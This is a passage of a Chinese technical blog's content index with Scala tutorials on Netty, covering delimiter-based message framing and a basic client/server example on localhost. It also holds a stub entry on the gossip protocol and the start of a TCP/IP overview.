<span class="comment">//服务启动辅助</span></span><br><span class="line">      <span class="keyword">val</span> serverBootstrap = <span class="keyword">new</span> <span class="type">ServerBootstrap</span>()</span><br><span class="line">      <span class="comment">//定义分隔符</span></span><br><span class="line">      <span class="keyword">val</span> delimiter = <span class="type">Unpooled</span>.copiedBuffer(<span class="string">"$*"</span>.getBytes())</span><br><span class="line">      <span class="comment">//添加I/O 事件处理,</span></span><br><span class="line">      serverBootstrap.group(bossGroup, workerGroup)</span><br><span class="line">        .channel(classOf[<span class="type">NioServerSocketChannel</span>]).option(<span class="type">ChannelOption</span>.<span class="type">SO_BACKLOG</span>.asInstanceOf[<span class="type">ChannelOption</span>[<span class="type">Any</span>]],<span class="number">1024</span>)</span><br><span class="line">        .childHandler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) = &#123;</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">DelimiterBasedFrameDecoder</span>(<span class="number">1024</span>,delimiter))</span><br><span class="line">           ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">StringDecoder</span>())</span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">LoggingHandler</span>(<span class="type">LogLevel</span>.<span class="type">DEBUG</span>))</span><br><span class="line">              ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">DelimiterServerHandler</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">//绑定端口,等待绑定完成</span></span><br><span class="line">      <span class="keyword">val</span> futureChannel = serverBootstrap.bind(host, port).sync()</span><br><span class="line">      futureChannel.channel().closeFuture().sync()</span><br><span class="line">    &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">      <span class="comment">//优雅关机</span></span><br><span class="line">      bossGroup.shutdownGracefully()</span><br><span class="line">      workerGroup.shutdownGracefully()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">DelimiterServer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server =<span class="keyword">new</span>  <span class="type">DelimiterServer</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9091</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.<span class="type">SimpleDateFormat</span></span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">Date</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DelimiterServerHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = println(<span class="string">"server: channelActive"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>) = println(<span class="string">"server channelReadComplete"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server channelRead invoked"</span>)</span><br><span class="line">    <span class="keyword">val</span> message = msg.asInstanceOf[<span class="type">String</span>]</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    println(<span class="string">s"服务端接收的内容:<span class="subst">$message</span>,总共计数为:<span class="subst">$count</span>"</span>)</span><br><span class="line">    <span class="keyword">val</span> currentTime = getCurrentTime()</span><br><span class="line">    <span class="keyword">val</span> back =<span class="keyword">if</span> (<span class="string">"EXIT"</span>.contains(message)) <span class="string">s"client请求EXIT,当前时间:<span class="subst">$currentTime</span>"</span></span><br><span class="line">                                      <span class="keyword">else</span> <span class="string">s"client请求信息:<span class="subst">$message</span>,当前时间:<span class="subst">$currentTime</span>"</span></span><br><span class="line">    <span class="keyword">val</span> resp = <span class="type">Unpooled</span>.copiedBuffer((back+<span class="string">"$*"</span>).getBytes(<span class="string">"UTF-8"</span>))</span><br><span class="line">    ctx.writeAndFlush(resp)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">getCurrentTime</span></span>(): <span class="type">String</span> =&#123;</span><br><span class="line">    <span class="keyword">val</span> format = <span class="keyword">new</span> <span class="type">SimpleDateFormat</span>(<span class="string">"YYYY-MM-dd HH:mm:ss.SSS"</span>)</span><br><span class="line">    format.format(<span class="keyword">new</span> <span class="type">Date</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">exceptionCaught</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, cause: <span class="type">Throwable</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server exception close"</span>)</span><br><span class="line">    ctx.close()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.<span class="type">Bootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioSocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelInitializer</span>, <span class="type">ChannelOption</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.<span class="type">DelimiterBasedFrameDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.string.<span class="type">StringDecoder</span></span><br><span class="line"><span class="keyword">import</span> io.netty.handler.logging.&#123;<span class="type">LogLevel</span>, <span class="type">LoggingHandler</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DelimiterClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">connect</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> work = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">    <span class="keyword">val</span> bootstrap = <span class="keyword">new</span> <span class="type">Bootstrap</span>()</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//定义分隔符</span></span><br><span class="line">      <span class="keyword">val</span> delimiter = <span class="type">Unpooled</span>.copiedBuffer(<span class="string">"$*"</span>.getBytes())</span><br><span class="line">      bootstrap.group(work).channel(classOf[<span class="type">NioSocketChannel</span>]).</span><br><span class="line">        option(<span class="type">ChannelOption</span>.<span class="type">TCP_NODELAY</span>.asInstanceOf[<span class="type">ChannelOption</span>[<span class="type">Any</span>]],<span class="literal">true</span>).handler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) =&#123;</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">DelimiterBasedFrameDecoder</span>(<span class="number">1024</span>,delimiter))</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">StringDecoder</span>())</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">LoggingHandler</span>(<span class="type">LogLevel</span>.<span class="type">DEBUG</span>))</span><br><span class="line">          ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">DelimiterClientHandler</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="keyword">val</span> funture = bootstrap.connect(host, port).sync()</span><br><span class="line">      funture.channel().closeFuture().sync()</span><br><span class="line">    &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">      work.shutdownGracefully()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">DelimiterClient</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> client = <span class="keyword">new</span> <span class="type">DelimiterClient</span></span><br><span class="line">    client.connect(<span class="string">"localhost"</span>,<span class="number">9091</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.<span class="type">Unpooled</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @since 1.8</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DelimiterClientHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelActive"</span>)</span><br><span class="line">    <span class="keyword">var</span> message:<span class="type">String</span> = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">for</span> (i &lt;<span class="number">-0</span> to <span class="number">50</span>)&#123;</span><br><span class="line">       <span class="keyword">if</span> ( i % <span class="number">2</span> == <span class="number">0</span> )&#123;</span><br><span class="line">          message = <span class="string">"EXIT"</span></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          message=<span class="string">"client发送到服务端信息:"</span></span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">val</span> finalMsg =message+i+<span class="string">"$*"</span></span><br><span class="line">      <span class="keyword">val</span> writeBuf =<span class="type">Unpooled</span>.buffer(finalMsg.length())</span><br><span class="line">      writeBuf.writeBytes(finalMsg.getBytes())</span><br><span class="line">      ctx.writeAndFlush(writeBuf)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelRead"</span>)</span><br><span class="line">    <span class="keyword">val</span> message = msg.asInstanceOf[<span class="type">String</span>]</span><br><span class="line">    println(message)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channeReadComplete"</span>)</span><br><span class="line">    ctx.flush()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于自定义分隔符实现消息编码。</p>
<blockquote>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
<li>《TCP/IP详解 卷一:协议》</li>
<li>《Netty权威指南》</li>
<li><a href="http://netty.io/wiki/user-guide-for-4.x.html" target="_blank" rel="noopener">Netty官网拆包、粘包</a></li>
<li><a href="http://www.infoq.com/cn/articles/netty-codec-framework-analyse" target="_blank" rel="noopener">Netty系列之Netty编解码框架分析</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>netty</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty基础入门</title>
    <url>/2017/11/01/distributed/Netty%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<blockquote>
<p>一、为什么选择Netty</p>
</blockquote>
<p>NIO面临的问题:</p>
<blockquote>
<h6 id="1-由于JAVA-NIO类库和API的繁杂-需要熟练掌握Selector-ServerSocketChannel-ByteBuffer等。"><a href="#1-由于JAVA-NIO类库和API的繁杂-需要熟练掌握Selector-ServerSocketChannel-ByteBuffer等。" class="headerlink" title="1. 由于JAVA NIO类库和API的繁杂,需要熟练掌握Selector,ServerSocketChannel,ByteBuffer等。"></a>1. 由于JAVA NIO类库和API的繁杂,需要熟练掌握Selector,ServerSocketChannel,ByteBuffer等。</h6><h6 id="2-客户端面临断线重连、网络闪断、半包读写等问题，要写出高可用的NIO比较困难。"><a href="#2-客户端面临断线重连、网络闪断、半包读写等问题，要写出高可用的NIO比较困难。" class="headerlink" title="2. 客户端面临断线重连、网络闪断、半包读写等问题，要写出高可用的NIO比较困难。"></a>2. 客户端面临断线重连、网络闪断、半包读写等问题，要写出高可用的NIO比较困难。</h6><h6 id="3-JDK-NIO-selector空轮询bug-摘自-具体内容参考-Java-epoll空轮询bug到底是怎样造成的"><a href="#3-JDK-NIO-selector空轮询bug-摘自-具体内容参考-Java-epoll空轮询bug到底是怎样造成的" class="headerlink" title="3. JDK NIO selector空轮询bug(摘自####),具体内容参考 Java epoll空轮询bug到底是怎样造成的?"></a>3. JDK NIO selector空轮询bug(摘自####),具体内容参考 <a href="https://www.zhihu.com/question/58242499/answer/229962137" target="_blank" rel="noopener">Java epoll空轮询bug到底是怎样造成的?</a></h6></blockquote>
<p>选择netty的理由:</p>
<p>API简单,方便开发出高性能、高可靠的网络通信应用而且社区活跃,广泛应用于互联网各行业。</p>
<blockquote>
<p>二、Netty入门例子</p>
</blockquote>
<p>添加netty依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.16.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<h6 id="2-1-服务端开发"><a href="#2-1-服务端开发" class="headerlink" title="2.1 服务端开发"></a>2.1 服务端开发</h6></blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.bootstrap.<span class="type">ServerBootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.<span class="type">ChannelInitializer</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioServerSocketChannel</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">bind</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line">      <span class="comment">//服务端接收客户端请求</span></span><br><span class="line">      <span class="keyword">val</span> bossGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">     <span class="comment">// 处理socketChannel网络读写请求</span></span><br><span class="line">      <span class="keyword">val</span> workerGroup = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//服务启动辅助</span></span><br><span class="line">        <span class="keyword">val</span> serverBootstrap = <span class="keyword">new</span> <span class="type">ServerBootstrap</span>()</span><br><span class="line">        <span class="comment">//添加I/O 事件处理,</span></span><br><span class="line">        serverBootstrap.group(bossGroup, workerGroup)</span><br><span class="line">          .channel(classOf[<span class="type">NioServerSocketChannel</span>]).childHandler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">          <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) = ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">ServerHandler</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//绑定端口,等待绑定完成</span></span><br><span class="line">        <span class="keyword">val</span> futureChannel = serverBootstrap.bind(host, port).sync()</span><br><span class="line">        futureChannel.channel().closeFuture().sync()</span><br><span class="line">      &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">          <span class="comment">//优雅关机</span></span><br><span class="line">          bossGroup.shutdownGracefully()</span><br><span class="line">          workerGroup.shutdownGracefully()</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Server</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> server = <span class="keyword">new</span> <span class="type">Server</span></span><br><span class="line">    server.bind(<span class="string">"localhost"</span>,<span class="number">9090</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>NioEventLoopGroup 是用来处理I/O操作的多线程事件循环器，Netty提供了许多不同的EventLoopGroup的实现用来处理不同传输协议。在这个例子中我们实现了一个服务端的应用，因此会有2个NioEventLoopGroup会被使用。第一个经常被叫做‘boss’，用来接收进来的连接。第二个经常被叫做‘worker’，用来处理已经被接收的连接，一旦‘boss’接收到连接，就会把连接信息注册到‘worker’上。如何知道多少个线程已经被使用，如何映射到已经创建的Channels上都需要依赖于EventLoopGroup的实现，并且可以通过构造函数来配置他们的关系。</p>
<p>ServerBootstrap 是一个启动NIO服务的辅助启动类。你可以在这个服务中直接使用Channel，但是这会是一个复杂的处理过程，在很多情况下你并不需要这样做。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.buffer.&#123;<span class="type">ByteBuf</span>, <span class="type">Unpooled</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServerHandler</span>(<span class="params"></span>) <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = println(<span class="string">"server: channelActive"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>) = println(<span class="string">"server channelReadComplete"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server channelRead invoked"</span>)</span><br><span class="line">    <span class="keyword">val</span> byteBuf = msg.asInstanceOf[<span class="type">ByteBuf</span>]</span><br><span class="line">    <span class="keyword">val</span> bytes = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Byte</span>](byteBuf.readableBytes())</span><br><span class="line">    byteBuf.readBytes(bytes)</span><br><span class="line">    <span class="keyword">val</span> message = <span class="keyword">new</span> <span class="type">String</span>(bytes, <span class="string">"UTF-8"</span>)</span><br><span class="line">    println(message)</span><br><span class="line">    <span class="keyword">val</span> back = <span class="string">"good boy!"</span></span><br><span class="line">    <span class="keyword">val</span> resp = <span class="type">Unpooled</span>.copiedBuffer(back.getBytes(<span class="string">"UTF-8"</span>))</span><br><span class="line">    println(msg)</span><br><span class="line">    ctx.writeAndFlush(resp)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">exceptionCaught</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, cause: <span class="type">Throwable</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"server exception close"</span>)</span><br><span class="line">    ctx.close()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h6 id="2-2-客户端开发"><a href="#2-2-客户端开发" class="headerlink" title="2.2 客户端开发"></a>2.2 客户端开发</h6></blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">mport io.netty.bootstrap.<span class="type">Bootstrap</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.<span class="type">ChannelInitializer</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.<span class="type">NioEventLoopGroup</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.<span class="type">SocketChannel</span></span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.<span class="type">NioSocketChannel</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">connect</span></span>(host:<span class="type">String</span>,port:<span class="type">Int</span>):<span class="type">Unit</span>=&#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">val</span> work = <span class="keyword">new</span> <span class="type">NioEventLoopGroup</span>()</span><br><span class="line">     <span class="keyword">val</span> bootstrap = <span class="keyword">new</span> <span class="type">Bootstrap</span>()</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">       bootstrap.group(work).channel(classOf[<span class="type">NioSocketChannel</span>]).handler(<span class="keyword">new</span> <span class="type">ChannelInitializer</span>[<span class="type">SocketChannel</span>] &#123;</span><br><span class="line">         <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">initChannel</span></span>(ch: <span class="type">SocketChannel</span>) = ch.pipeline().addLast(<span class="keyword">new</span> <span class="type">ClientHandler</span>())</span><br><span class="line">       &#125;)</span><br><span class="line">       <span class="keyword">val</span> funture = bootstrap.connect(host, port).sync()</span><br><span class="line">       funture.channel().closeFuture().sync()</span><br><span class="line">     &#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">       work.shutdownGracefully()</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Client</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">client</span> </span>= <span class="keyword">new</span> <span class="type">Client</span></span><br><span class="line">    client.connect(<span class="string">"localhost"</span>,<span class="number">9090</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.buffer.&#123;<span class="type">ByteBuf</span>, <span class="type">Unpooled</span>&#125;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.&#123;<span class="type">ChannelHandlerContext</span>, <span class="type">ChannelInboundHandlerAdapter</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClientHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelActive</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelActive"</span>)</span><br><span class="line">    <span class="keyword">val</span> content = <span class="string">"hello server"</span></span><br><span class="line">    ctx.writeAndFlush(<span class="type">Unpooled</span>.copiedBuffer(content.getBytes(<span class="string">"UTF-8"</span>)))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelRead</span></span>(ctx: <span class="type">ChannelHandlerContext</span>, msg: scala.<span class="type">Any</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channelRead"</span>)</span><br><span class="line">    <span class="keyword">val</span> byteBuf = msg.asInstanceOf[<span class="type">ByteBuf</span>]</span><br><span class="line">    <span class="keyword">val</span> bytes = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Byte</span>](byteBuf.readableBytes())</span><br><span class="line">    byteBuf.readBytes(bytes)</span><br><span class="line">    <span class="keyword">val</span> message = <span class="keyword">new</span> <span class="type">String</span>(bytes, <span class="string">"UTF-8"</span>)</span><br><span class="line">    println(message)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">channelReadComplete</span></span>(ctx: <span class="type">ChannelHandlerContext</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(<span class="string">"client channeReadComplete"</span>)</span><br><span class="line">    ctx.flush()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先做一个简单的入门例子,具体的API后期再深入源码看一下。</p>
<blockquote>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul>
<li>《Unix网络编程》</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>netty</tag>
      </tags>
  </entry>
  <entry>
    <title>gossip算法</title>
    <url>/2019/04/01/distributed/gossip%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Gossip_protocol" target="_blank" rel="noopener">Gossip_protocol wiki</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>gossip</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP/IP详解</title>
    <url>/2017/11/24/distributed/TCP%20IP%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>Transmission Control Protocol/Internet Protocol的简写，中译名为传输控制协议/因特网互联协议，又名网络通讯协议，是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。TCP/IP 定义了电子设备如何连入因特网，以及数据如何在它们之间传输的标准。协议采用了4层的层级结构，每一层都呼叫它的下一层所提供的协议来完成自己的需求。通俗而言：TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。</p>
<blockquote>
<h1 id="TCP-IP概述"><a href="#TCP-IP概述" class="headerlink" title="TCP/IP概述"></a>TCP/IP概述</h1><h2 id="协议分层"><a href="#协议分层" class="headerlink" title="协议分层"></a>协议分层</h2></blockquote>
<p>TCP/IP四层模型和OSI七层模型</p>
<p><img src="https://i.imgur.com/QburWE9.png" alt></p>
<blockquote>
